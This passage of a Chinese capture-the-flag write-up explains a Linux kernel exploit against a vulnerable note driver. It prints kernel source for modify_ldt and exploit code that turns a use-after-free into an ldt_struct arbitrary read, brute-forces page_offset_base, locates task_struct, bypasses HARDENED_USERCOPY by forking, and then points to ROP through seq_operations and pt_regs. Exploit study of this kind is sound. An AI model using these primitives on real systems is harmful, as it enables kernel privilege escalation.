+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>根据参数 func 来确定分别调用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L494"><code>read_ldt</code></a>，<a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L570"><code>write_ldt</code></a> 等</p>
+<p>ptr 是 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/include/uapi/asm/ldt.h#L21"><code>user_desc</code></a> 结构体的指针：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">user_desc</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  entry_number<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  base_addr<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  limit<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  seg_32bit<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  contents<span class="token operator">:</span><span class="token number">2</span><span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  read_exec_only<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  limit_in_pages<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  seg_not_present<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  useable<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">__x86_64__</span></span>
+	<span class="token comment">/*
+	 * Because this bit is not present in 32-bit user code, user
+	 * programs can pass uninitialized values here.  Therefore, in
+	 * any context in which a user_desc comes from a 32-bit program,
+	 * the kernel must act as though lm == 0, regardless of the
+	 * actual value.
+	 */</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span>  lm<span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="read-ldt"><a href="#read-ldt" class="headerlink" title="read_ldt"></a>read_ldt</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">read_ldt</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> bytecount<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm <span class="token operator">=</span> current<span class="token operator">-></span>mm<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> entries_size<span class="token punctuation">;</span>
+	<span class="token keyword">int</span> retval<span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+    
+	entries_size <span class="token operator">=</span> mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt<span class="token operator">-></span>nr_entries <span class="token operator">*</span> LDT_ENTRY_SIZE<span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>entries_size <span class="token operator">></span> bytecount<span class="token punctuation">)</span>
+		entries_size <span class="token operator">=</span> bytecount<span class="token punctuation">;</span>
+
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_to_user</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt<span class="token operator">-></span>entries<span class="token punctuation">,</span> entries_size<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		retval <span class="token operator">=</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span>
+		<span class="token keyword">goto</span> out_unlock<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+out_unlock<span class="token operator">:</span>
+	<span class="token function">up_read</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt_usr_sem<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> retval<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>可以看到使用 copy_to_user 从 entries 指针向用户空间拷贝数据</p>
+<h4 id="write-ldt"><a href="#write-ldt" class="headerlink" title="write_ldt"></a>write_ldt</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">write_ldt</span><span class="token punctuation">(</span><span class="token keyword">void</span> __user <span class="token operator">*</span>ptr<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">long</span> bytecount<span class="token punctuation">,</span> <span class="token keyword">int</span> oldmode<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm <span class="token operator">=</span> current<span class="token operator">-></span>mm<span class="token punctuation">;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">ldt_struct</span> <span class="token operator">*</span>new_ldt<span class="token punctuation">,</span> <span class="token operator">*</span>old_ldt<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> old_nr_entries<span class="token punctuation">,</span> new_nr_entries<span class="token punctuation">;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">user_desc</span> ldt_info<span class="token punctuation">;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">desc_struct</span> ldt<span class="token punctuation">;</span>
+	<span class="token keyword">int</span> error<span class="token punctuation">;</span>
+
+	error <span class="token operator">=</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>bytecount <span class="token operator">!=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ldt_info<span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token keyword">goto</span> out<span class="token punctuation">;</span>
+	error <span class="token operator">=</span> <span class="token operator">-</span>EFAULT<span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">copy_from_user</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ldt_info<span class="token punctuation">,</span> ptr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ldt_info<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+		<span class="token keyword">goto</span> out<span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>oldmode <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ldt_info<span class="token punctuation">.</span>base_addr <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>ldt_info<span class="token punctuation">.</span>limit<span class="token punctuation">)</span> <span class="token operator">||</span>
+	    <span class="token function">LDT_empty</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ldt_info<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+		<span class="token comment">/* The user wants to clear the entry. */</span>
+		<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ldt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ldt<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>ldt_info<span class="token punctuation">.</span>seg_32bit <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">allow_16bit_segments</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+			error <span class="token operator">=</span> <span class="token operator">-</span>EINVAL<span class="token punctuation">;</span>
+			<span class="token keyword">goto</span> out<span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+
+		<span class="token function">fill_ldt</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>ldt<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ldt_info<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span>oldmode<span class="token punctuation">)</span>
+			ldt<span class="token punctuation">.</span>avl <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+
+	old_ldt       <span class="token operator">=</span> mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt<span class="token punctuation">;</span>
+	old_nr_entries <span class="token operator">=</span> old_ldt <span class="token operator">?</span> old_ldt<span class="token operator">-></span>nr_entries <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">;</span>
+	new_nr_entries <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>ldt_info<span class="token punctuation">.</span>entry_number <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> old_nr_entries<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	error <span class="token operator">=</span> <span class="token operator">-</span>ENOMEM<span class="token punctuation">;</span>
+	new_ldt <span class="token operator">=</span> <span class="token function">alloc_ldt_struct</span><span class="token punctuation">(</span>new_nr_entries<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>new_ldt<span class="token punctuation">)</span>
+		<span class="token keyword">goto</span> out_unlock<span class="token punctuation">;</span>
+
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>old_ldt<span class="token punctuation">)</span>
+		<span class="token function">memcpy</span><span class="token punctuation">(</span>new_ldt<span class="token operator">-></span>entries<span class="token punctuation">,</span> old_ldt<span class="token operator">-></span>entries<span class="token punctuation">,</span> old_nr_entries <span class="token operator">*</span> LDT_ENTRY_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	new_ldt<span class="token operator">-></span>entries<span class="token punctuation">[</span>ldt_info<span class="token punctuation">.</span>entry_number<span class="token punctuation">]</span> <span class="token operator">=</span> ldt<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>write_ldt 使用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L149"><code>alloc_ldt_struct</code></a> 来分配 <code>ldt_struct</code>：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">struct</span> <span class="token class-name">ldt_struct</span> <span class="token operator">*</span><span class="token function">alloc_ldt_struct</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_entries<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	new_ldt <span class="token operator">=</span> <span class="token function">kmalloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">ldt_struct</span><span class="token punctuation">)</span><span class="token punctuation">,</span> GFP_KERNEL<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token keyword">return</span> new_ldt<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="Leak"><a href="#Leak" class="headerlink" title="Leak"></a>Leak</h3><p>利用 modify_ldt 系统调用，不难想到一个 leak 内核地址的思路</p>
+<ol>
+<li>ADD -&gt; SELECT -&gt; DELETE，构造 UAF</li>
+<li>通过 write_ldt 分配到被释放的 object</li>
+<li>EDIT 修改 entries 指针</li>
+<li>read_ldt 即可读取数据</li>
+</ol>
+<p>由于 copy_to_user 访问无效的地址并不会造成内核 panic，只会返回非 0 值，最后导致 modify_ldt 返回 <code>-EFAULT</code>，我们可以直接爆破内核地址</p>
+<p>但是因为开启了 <strong>HARDENED_USERCOPY</strong>，当 copy_to_user 拷贝源地址为内核 .text 地址会造成 panic，因此不能直接爆破内核地址</p>
+<p>可以改而爆破 <code>direct mapping area</code>（线性映射区）的起始地址 <strong>page_offset_base</strong>，实际上大小为 1G，kmalloc 就是从这里分配内存，可以从这里搜索找到 task_struct 结构体，进一步泄露更多数据</p>
+<h4 id="Bruteforce"><a href="#Bruteforce" class="headerlink" title="Bruteforce"></a>Bruteforce</h4><p>爆破 <strong>page_offset_base</strong> 模板：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c">    <span class="token class-name">uint64_t</span> page_offset_base <span class="token operator">=</span> <span class="token number">0xffff888000000000uLL</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token keyword">struct</span> <span class="token class-name">user_desc</span> desc<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    desc<span class="token punctuation">.</span>base_addr<span class="token operator">=</span><span class="token number">0xff0000</span><span class="token punctuation">;</span>
+    desc<span class="token punctuation">.</span>entry_number<span class="token operator">=</span><span class="token number">0x8000</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_ADD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_SELECT<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_DELETE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    
+    <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>desc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>desc<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// new ldt_struct</span>
+
+    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"searching page_offset_base..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_EDIT<span class="token punctuation">,</span> page_offset_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>tmp<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            page_offset_base <span class="token operator">+=</span> <span class="token number">1</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span><span class="token punctuation">;</span>  <span class="token comment">// direct mapping size = 1G</span>
+            <span class="token keyword">continue</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+        <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h4 id="Searching"><a href="#Searching" class="headerlink" title="Searching"></a>Searching</h4><p><a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/include/linux/sched.h#L973"><code>task_struct</code></a>存在一些有用的字段：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">task_struct</span> <span class="token punctuation">&#123;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token comment">/* Process credentials: */</span>
+
+	<span class="token comment">/* Tracer's credentials at attach: */</span>
+	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu		<span class="token operator">*</span>ptracer_cred<span class="token punctuation">;</span>
+
+	<span class="token comment">/* Objective and real subjective task credentials (COW): */</span>
+	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu		<span class="token operator">*</span>real_cred<span class="token punctuation">;</span>
+
+	<span class="token comment">/* Effective (overridable) subjective task credentials (COW): */</span>
+	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">cred</span> __rcu		<span class="token operator">*</span>cred<span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token keyword">char</span>				comm<span class="token punctuation">[</span>TASK_COMM_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token keyword">struct</span> <span class="token class-name">files_struct</span>		<span class="token operator">*</span>files<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中 comm 为进程的名字，可以通过  <code>prctl(PR_SET_NAME, &quot;myname&quot;)</code> 来设置，通过该字段就能定位到 task_struct 的位置</p>
+<p>task_struct 还存在一个 files 字段，记录了进程打开的文件信息，结构体为 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/include/linux/fdtable.h#L49"><code>files_struct</code></a>：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">files_struct</span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">/*
+   * read mostly part
+   */</span>
+	<span class="token class-name">atomic_t</span> count<span class="token punctuation">;</span>
+	bool resize_in_progress<span class="token punctuation">;</span>
+	<span class="token class-name">wait_queue_head_t</span> resize_wait<span class="token punctuation">;</span>
+
+	<span class="token keyword">struct</span> <span class="token class-name">fdtable</span> __rcu <span class="token operator">*</span>fdt<span class="token punctuation">;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">fdtable</span> fdtab<span class="token punctuation">;</span>
+  <span class="token comment">/*
+   * written part on a separate cache line in SMP
+   */</span>
+	<span class="token class-name">spinlock_t</span> file_lock ____cacheline_aligned_in_smp<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">int</span> next_fd<span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> close_on_exec_init<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> open_fds_init<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> full_fds_bits_init<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	<span class="token keyword">struct</span> <span class="token class-name">file</span> __rcu <span class="token operator">*</span> fd_array<span class="token punctuation">[</span>NR_OPEN_DEFAULT<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>跟踪 fd_array 字段，即结构体 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/include/linux/fs.h#L915"><code>file</code></a></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">file</span> <span class="token punctuation">&#123;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">file_operations</span>	<span class="token operator">*</span>f_op<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">&#125;</span> __randomize_layout
+  <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">aligned</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	<span class="token comment">/* lest something weird decides that 2 is OK */</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>读取 f_op 指针即可获取到内核地址</p>
+<h4 id="Safe-Leak"><a href="#Safe-Leak" class="headerlink" title="Safe Leak"></a>Safe Leak</h4><p>直接搜索整个线性映射区域仍有可能触发 <strong>HARDENED_USERCOPY</strong> 的检查，官方利用 fork 时，调用 <a target="_blank" rel="external nofollow noopener noreferrer" href="https://elixir.bootlin.com/linux/v5.11.9/source/arch/x86/kernel/ldt.c#L443"><code>ldt_dup_context</code></a> 拷贝 ldt 来安全的 leak 数据</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*
+ * Called on fork from arch_dup_mmap(). Just copy the current LDT state,
+ * the new task is not running, so nothing can be installed.
+ */</span>
+<span class="token keyword">int</span> <span class="token function">ldt_dup_context</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>old_mm<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">mm_struct</span> <span class="token operator">*</span>mm<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token function">memcpy</span><span class="token punctuation">(</span>new_ldt<span class="token operator">-></span>entries<span class="token punctuation">,</span> old_mm<span class="token operator">-></span>context<span class="token punctuation">.</span>ldt<span class="token operator">-></span>entries<span class="token punctuation">,</span>
+	       new_ldt<span class="token operator">-></span>nr_entries <span class="token operator">*</span> LDT_ENTRY_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>因为这里使用的是 memcpy，发生在内核空间内的拷贝，并不会有 HARDENED_USERCOPY 检查，只要再父进程 UAF 修改 entries，fork 后子进程进行 read_ldt，即可安全的进行任意地址读</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">;</span>
+
+<span class="token keyword">void</span> <span class="token function">safe_read</span><span class="token punctuation">(</span><span class="token class-name">uint64_t</span> addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> NOTE_EDIT<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"fork error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token comment">// child</span>
+        <span class="token function">syscall</span><span class="token punctuation">(</span>SYS_modify_ldt<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+        <span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	buf <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0x8000</span><span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED <span class="token operator">|</span> MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+	<span class="token function">safe_read</span><span class="token punctuation">(</span>target<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h3 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h3><p>有了内核地址后，再次构造 UAF 劫持 <strong>seq_operations</strong>，利用 <strong>pt_regs</strong> 进行 ROP 即可</p>
